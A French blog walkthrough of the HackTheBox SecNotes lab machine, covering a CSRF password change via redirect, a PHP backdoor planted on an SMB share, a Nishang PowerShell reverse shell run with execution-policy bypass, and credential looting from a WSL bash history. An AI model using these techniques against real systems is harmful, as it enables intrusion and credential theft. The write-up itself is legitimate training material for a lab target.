# Solution du CTF SecNotes de HackTheBox

Yo Dawg
-------

Notre cible d'aujourd'hui a l'adresse 10.10.10.97 et 3 ports ouverts : le port 445 (SMB) et deux serveurs web sur les numéros 80 et 8808.  

Ces deux derniers s'identifient comme IIS 10.0 tandis que le SMB indique un OS Windows 10 Entreprise avec un hostname SECNOTES et le workgroup HTB.  

L'énumération des partages sans authentification est refusée  

Sur le port 8808 on trouve la page par défaut d'IIS mais sur le port 80 se trouvent différentes pages php (login, register...).  

La page de login est vulnérable à une énumération des utilisateurs car avec un nom bidon on obtient le message explicite *No account found with that username.*  

Si on créé un compte et que l'on saisit un mot de passe invalide on obtient cette fois *The password you entered was not valid.*

On note aussi au moment de l'enregistrement que les mots de passe doivent faire au minimum 6 caractères. C'est toujours bon à savoir si on doit effectuer un brute-force.  

Quand on est connecté on est face à un système de gestion de mémos. Et on voit un premier nom d'utilisateur ainsi qu'un lien de contact qui amène vers un formulaire pour envoyer un message à cet utilisateur.  

![HackTheBox SecNotes members website](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/secnotes_home.png)

Du coup on met un port en écoute et on envoie un lien par ce formulaire pour voir si quelqu'un mort à l'hameçon. Et la pèche est bonne :  

```plain
GET /index.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.10.97
Connection: Keep-Alive
```

Le user-agent mentionnant *PowerShell* laisse supposer qu'en background il y a un script powershell utilisant les classe [WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=netframework-4.7.2) ou [WebRequest](https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest?view=netframework-4.7.2).  

Du coup à l'instar du fabuleux module *requests* de Python il ne faut pas s'attendre ici à de l'interprétation de javascript : on n'a pas à faire à un browser headless.  

On met donc à la trappe les XSS, formulaires en auto-submit et autres *browser\_autopwn* de *Metasploit* :(   

Le site dispose d'un script de changement de mot de passe qui soumet ses données via POST. Avec de la chance ce script acceptera de récupérer ses arguments depuis l'URL (via GET).  

Il suffit de tester avec notre compte avec l'URL suivante :  

```plain
http://secnotes.htb/change_pass.php?password=devloop456&confirm_password=devloop456&submit=submit
```

On obtient alors un message indiquant que le mot de passe a été changé. Suspense : on déconnecte, on rentre le nouveau pass, ça marche :)  

Si on fouille un peu dans la doc PowerShell on voit que *WebClient* suit par défaut les redirections et ce jusqu'à 50 redirections chaînées.  

L'étape suivante consiste à écrire un script PHP qui effectue juste un *header("Location: url\_provoquant\_le\_changement\_de\_password")* puis lancer un serveur web minimaliste avec support du PHP.  

On envoie ensuite le lien à *tyler* pour provoquer le changement de son mot de passe :  

```plain
$ php -S 10.10.14.35:8080
PHP 7.2.9-1 Development Server started at Wed Aug 29 11:04:35 2018
Listening on http://10.10.14.35:8080
Document root is /home/devloop/Documents/secnotes/jail
Press Ctrl-C to quit.
[Wed Aug 29 11:05:58 2018] 10.10.10.97:63765 [302]: /
```

Une fois connecté on voit des identifiants parmi les mémos de *Tyler* :  

![HackTheBox SecNotes Tyler credentials](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/secnotes_newsite_passwd.png)

Run-P.H.P.
----------

Bien sûr on est tenté d'utiliser ces identifiants pour lancer un psexec / wmiexec... mais ça ne marche pas.  

Les identifiants nous donnent toutefois accès en écriture à un partage baptisé *new-site* :  

```plain
$ smbclient -U tyler //secnotes.htb/new-site
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\tyler's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 29 11:10:53 2018
  ..                                  D        0  Wed Aug 29 11:10:53 2018
  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
```

Ces fichier correspondent à ce que l'on peut trouver sur le port 8808. On peut y placer du PHP qui sera interprété, peut être aussi de l'ASP mais *Windows Defender* est prêt à supprimer nos web-meterpreters.  

J'ai commencé par uploader une backdoor généraliste (voir [ce précédent article](http://devloop.users.sourceforge.net/index.php?article128/tales-of-pentest-1-celui-qui-donnait-la-permission-file)) histoire de fouiller un peu :  

```plain
$ curl --data 'f=scandir&a=c:/users/&rf=print_r' http://secnotes.htb:8808/devloop_.php
Array
(
    [0] => .
    [1] => ..
    [2] => Administrator
    [3] => All Users
    [4] => Default
    [5] => Default User
    [6] => DefaultAppPool
    [7] => Public
    [8] => desktop.ini
    [9] => new
    [10] => newsite
    [11] => tyler
    [12] => wayne
)
```

On trouve notre premier flag :  

```plain
$ curl --data 'f=readfile&a=c:/users/tyler/desktop/user.txt' http://secnotes.htb:8808/devloop_.php
6fa7556968052a83183fb8099cb904f3
```

Et des identifiants dans *C:/inetpub/wwwroot/db.php* :  

```php
<?php

if ($includes != 1) {
    die("ERROR: Should not access directly.");
}

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'secnotes');
define('DB_PASSWORD', 'q8N#9Eos%JinE57tke72');
//define('DB_USERNAME', 'root');
//define('DB_PASSWORD', 'qwer1234QWER!@#$');
define('DB_NAME', 'secnotes');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Pour obtenir un reverse shell j'ai uploadé le script [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) de *Nishang* après l'avoir édité pour rajouter l'instruction d'appel du reverse shell (spécifiant mon IP et mon port).  

Le script s'appelle de cette façon :  

```bash
powershell.exe -nop -exec bypass -Command "& .\Invoke-PowerShellTcp.ps1"
```

A partir de ce shell j'ai chargé et exécuté différents scripts (*Find-AllVulns* de [Sherlock](https://github.com/rasta-mouse/Sherlock) et différentes méthodes de [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)) sans résultats.  

Pimp my Windows
---------------

A la racine du disque C on trouve un dossier *Distros* énigmatique :  

```plain
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of c:\Distros\Ubuntu

09/01/2018  06:47 AM    <DIR>          .
09/01/2018  06:47 AM    <DIR>          ..
07/11/2017  06:10 PM           190,434 AppxBlockMap.xml
07/11/2017  06:10 PM             2,475 AppxManifest.xml
06/21/2018  03:07 PM    <DIR>          AppxMetadata
07/11/2017  06:11 PM            10,554 AppxSignature.p7x
06/21/2018  03:07 PM    <DIR>          Assets
06/21/2018  03:07 PM    <DIR>          images
07/11/2017  06:10 PM       201,254,783 install.tar.gz
07/11/2017  06:10 PM             4,840 resources.pri
06/21/2018  05:51 PM    <DIR>          temp
07/11/2017  06:10 PM           222,208 ubuntu.exe
07/11/2017  06:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  32,692,867,072 bytes free
```

Il s'agit en fait de *WSL* (*Windows Subsystem for Linux*) qui permet aux utilisateurs de la lucarne d'avoir finalement un shell civilisé :p  

Ces fichiers sont modifiables par les utilisateurs authentifiés (par login). Il y a toutefois un fichier de signature et ce serait peut être compliqué de s'y attaquer :  

```plain
c:\Distros\Ubuntu\ubuntu.exe BUILTIN\Administrators:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)
                             BUILTIN\Users:(I)(RX)
                             NT AUTHORITY\Authenticated Users:(I)(M)

c:\Distros\Ubuntu\AppxSignature.p7x BUILTIN\Administrators:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    BUILTIN\Users:(I)(RX)
                                    NT AUTHORITY\Authenticated Users:(I)(M)
```

Je suis donc passé dans le shell WSL en exécutant la commande bash (tout simplement). Il aura tout de même fallut abandonner mon shell PowerShell (j'avais une erreur de TTY pour le lancement du bash) et le remplacer par un *netcat* 64 bits (j'aurais préféré l'équivalent *Ncat* mais je n'ai pas trouvé en 64).  

Unfocus
-------

Des fois à être trop obnubilé par un élément on s'enfonce dans la mauvaise direction. Et là le dossier *Administrator* ne peut qu'attirer notre attention :  

```plain
C:\inetpub\new-site>bash
bash
mesg: ttyname failed: Inappropriate ioctl for device
cd /mnt/c/Users/Administrator
ls -l
ls: cannot open directory '.': Permission denied
chmod 777 .
ls -l
ls: cannot open directory '.': Permission denied
sudo chmod 777 .
ls -l
ls: cannot open directory '.': Permission denied
stat .
  File: .
  Size: 512         Blocks: 0          IO Block: 512    directory
Device: ch/12d  Inode: 1407374883767796  Links: 1
Access: (0111/d--x--x--x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2018-09-02 23:55:54.217896800 -0700
Modify: 2018-06-22 16:44:33.039313500 -0700
Change: 2018-08-19 10:07:38.030478600 -0700
 Birth: -
id
uid=0(root) gid=0(root) groups=0(root)
lsattr .
cat Desktop/root.txt
cat: Desktop/root.txt: Permission denied
sudo cat Desktop/root.txt
cat: Desktop/root.txt: Permission denied
```

Via l'[interopérabilité](https://docs.microsoft.com/en-us/windows/wsl/interop) il est possible d'exécuter des commandes Windows depuis le bash WSL. Cela ne m'a mené nul part.  

J'ai aussi tenté de remonter le disque C [avec l'option metadata](https://blogs.msdn.microsoft.com/commandline/2018/01/12/chmod-chown-wsl-improvements/) mais la version présente de WSL ne semblait pas supporter cette fonctionnalité (l'umask n’apparaît pas dans la liste des points de montage).  

Si on s'en tient à [la documentation de WSL traitant des permissions](https://docs.microsoft.com/en-us/windows/wsl/user-support) il ne faut s'attendre à aucune magie :  

> When running Linux on WSL, Linux will have the same Windows permissions as the process that launches it.

Il faudrait pouvoir exécuter le WSL avec des privilèges supplémentaires pour parvenir à quelque chose. Le manifeste qui vient avec l'exécutable *ubuntu.exe* contient la mention *runFullTrust* mais ce n'est visiblement pas ce qu'on espère.  

Finalement si on va voir dans le *.bash\_history* de *root* on trouve des identifiants (et un gros sentiment de fatigue instantané :'D)  

```bash
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
exitls
```

La suite on la devine :  

```plain
$ smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\secnotes.htb\\c$
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> cd Users/Administrator/Desktop
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

Et à nous le flag root (*7250cde1cab0bbd93fc1edbdc83d447b*).  

Toujours un plaisir de s'exercer sur des machines Windows :)

*Published January 19 2019 at 17:09*